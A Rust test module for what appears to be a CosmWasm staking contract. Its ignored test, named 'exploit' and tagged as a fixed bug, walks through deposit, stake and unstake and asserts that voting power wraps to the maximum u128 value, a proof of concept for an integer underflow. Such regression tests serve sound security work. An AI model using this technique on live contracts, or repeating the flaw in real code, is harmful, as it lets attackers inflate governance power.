#[cfg(test)]
pub mod tests {
    use cosmwasm_std::{
        coin, to_binary, BankMsg, Binary, Deps, DepsMut, Env, MessageInfo, Response, StdResult, Uint128, Addr,
    };
    use cw_multi_test::Executor;

    use crate::{contract::{DENOM, LOCK_PERIOD}, state::UserInfo, msg::{QueryMsg, ExecuteMsg}, integration_tests::tests::{mint_tokens, proper_instantiate}};
    pub const USER: &str = "user";
    pub const ADMIN: &str = "admin";
    #[ignore="fixed bug"]
    #[test]
    fn exploit(){
        let (mut app, contract_addr) = proper_instantiate();

        let amount = Uint128::new(1_000);

        app = mint_tokens(app, USER.to_string(), amount);
        
        let sender = Addr::unchecked(USER);
        // deposit funds
        let msg = ExecuteMsg::Deposit {};
        app.execute_contract(
            sender.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(amount.u128(), DENOM)],
        )
        .unwrap();

        // no funds left
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(balance, Uint128::zero());

        // query user
        let msg = QueryMsg::GetUser {
            user: (&USER).to_string(),
        };
        let user: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(user.total_tokens, amount);

        // cannot stake more than deposited
        let msg = ExecuteMsg::Stake {
            lock_amount: amount.u128() + 1,
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap_err();

        // normal stake
        let msg = ExecuteMsg::Stake {
            lock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // query voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, amount.u128());

        // cannot unstake before maturity
        let msg = ExecuteMsg::Unstake {
            unlock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap_err();

        // cannot withdraw while staked
        let msg = ExecuteMsg::Withdraw { amount };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap_err();

        // fast forward time
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // normal unstake
        let msg = ExecuteMsg::Unstake {
            unlock_amount: amount.u128() ,
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // no more voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, 340282366920938463463374607431768211455_u128);

    }
}